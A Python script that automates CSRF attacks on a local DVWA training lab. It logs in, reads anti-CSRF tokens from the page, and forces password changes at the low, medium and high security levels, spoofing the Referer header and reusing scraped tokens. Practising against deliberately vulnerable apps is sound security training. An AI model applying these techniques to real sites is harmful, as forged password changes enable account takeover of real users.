import sys
import requests
import re

DVWA_URL = "http://localhost/DVWA"  # Base URL of your DVWA instance

# Function to log in to DVWA
def login_to_dvwa(session):
    login_url = f"{DVWA_URL}/login.php"
    login = session.get(login_url)
    pattern = r"<input\s+type='hidden'\s+name='user_token'\s+value='(.*?)'\s*/?>"

    # Search for the pattern in the HTML content
    match = re.search(pattern, login.text)
    user_token = match.group(1) or ''
    post_data = {
        "username": "admin",
        "password": "123",
        "Login": "Login",
        "user_token": user_token
    }
    validation = session.post(login_url, data=post_data)
    if 'Login failed' in validation.text:
        print('Login Failed')
        sys.exit()
    else:
        print('Login Successful')


# Function to perform CSRF exploitation
def exploit_csrf(session, security_level):
    # Step 1: Determine the CSRF vulnerability URL based on security level
    csrf_url = f"{DVWA_URL}/vulnerabilities/csrf/"
    if security_level == 'low' :
        # CSRF exploit for low security level
        print(session.headers)
        exploit_data = {
            'password_new': 'new_password',
            'password_conf': 'new_password',
            'Change': 'Change'
        }
        response = session.get(csrf_url, params=exploit_data)
        return response

    elif security_level == 'medium':
    #     # CSRF exploit for medium security level    
    #     # response = session.get(csrf_url)
        exploit_data = {
            'password_new': 'medium',
            'password_conf': 'medium',
            'Change': 'Change'
        }
        session.headers.update({
            'Referer' : csrf_url
        })
        response = session.get(csrf_url, params=exploit_data)
        return response
    elif security_level == 'high':
        # CSRF exploit for high security level
        response = session.get(csrf_url)
        pattern = r"<input\s+type='hidden'\s+name='user_token'\s+value='(.*?)'\s*/?>"

        # Search for the pattern in the HTML content
        match = re.search(pattern, response.text)
        user_token = match.group(1) or ''
        exploit_data = {
            'password_new': 'high',
            'password_conf': 'high',
            'Change': 'Change',
            'user_token' : user_token
        }
        response = session.get(csrf_url, params=exploit_data)
        return response
    else:
        raise ValueError("Invalid security level specified.")
    

def main():
    with requests.Session() as session:
        # Log in to DVWA
        login_to_dvwa(session)

        security = session.get(f"{DVWA_URL}/security.php")
        # data = re.search(r"<em>(.*?)</em>", security.text)
        # print(data.group(1))
        # if data.group(1) == 'impossible':


        
        # Exploit CSRF vulnerabilities at different security levels
        for level in ['low', 'medium', 'high']:
            print('-----------------------------------------------------------------')
            print(f"Exploiting CSRF vulnerability at {level} security level...")
            pattern = r"<input\s+type='hidden'\s+name='user_token'\s+value='(.*?)'\s*/?>"

            # Search for the pattern in the HTML content
            security = session.get(f"{DVWA_URL}/security.php")
            match = re.search(pattern, security.text)
            user_token = match.group(1) or ''
            security_config = {
                'security': level,
                'seclev_submit': 'Submit',
                'user_token': user_token
            }
            session.post(f"{DVWA_URL}/security.php", data=security_config)
            security = session.get(f"{DVWA_URL}/security.php")
            data = re.search(r"<em>(.*?)</em>", security.text)
            print(data.group(1) or None)
            print("Security level set to", level)
            response = exploit_csrf(session, level)
            if response.status_code == 200:
                final_status = re.search(r'<pre>(.*?)<\/pre>', response.text)
                print(final_status.group(1))
                print(f"CSRF exploit successful at {level} level.")
            else:
                print(f"Failed to exploit CSRF at {level} level. Status code: {response.status_code}")

if __name__ == "__main__":
    main()
